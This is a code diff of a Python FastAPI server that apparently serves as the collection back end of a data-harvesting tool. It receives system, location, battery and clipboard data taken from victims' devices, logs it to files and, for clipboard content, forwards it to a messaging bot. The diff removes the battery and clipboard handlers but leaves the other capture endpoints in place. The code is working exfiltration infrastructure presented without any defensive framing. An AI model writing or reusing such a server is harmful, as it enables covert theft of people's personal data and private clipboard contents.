@@ -94,7 +94,7 @@ async def serve_index():
     if os.path.exists(path):
         with open(path, "r", encoding="utf-8") as f: 
             return HTMLResponse(f.read())
-    return HTMLResponse("<h1>Error: Template not found</h1>")
+    return HTMLResponse("<h1>Template not found</h1>")
 
 @app.post("/upload_sys")
 async def receive_sys(data: str = Form(...)):
@@ -186,38 +186,6 @@ async def receive_location(data: str = Form(...)):
         save_local("location.txt", json.dumps(info, indent=2))
         return {"status": "ok"}
         
-    except:
-        return {"status": "error"}
-
-@app.post("/upload_battery")
-async def receive_battery(data: str = Form(...)):
-    try:
-        info = json.loads(data)
-        console.print(f"[cyan][+] Battery: {info.get('level', 'Unknown')}%[/cyan]")
-        save_local("battery.txt", json.dumps(info, indent=2))
-        return {"status": "ok"}
-    except:
-        return {"status": "error"}
-
-@app.post("/upload_clipboard")
-async def receive_clipboard(data: str = Form(...)):
-    try:
-        info = json.loads(data)
-        content = info.get('content', '')
-        
-        if content:
-            console.print(Panel(
-                f"[bold red]📋 CLIPBOARD DATA[/bold red]\n\n"
-                f"[cyan]Content:[/cyan] {content[:100]}{'...' if len(content) > 100 else ''}",
-                title="Clipboard Capture",
-                border_style="red"
-            ))
-            
-            if bot:
-                bot.send_message(f"📋 *Clipboard*\n\n`{content[:300]}`")
-        
-        save_local("clipboard.txt", f"Clipboard: {content}")
-        return {"status": "ok"}
     except:
         return {"status": "error"}
 
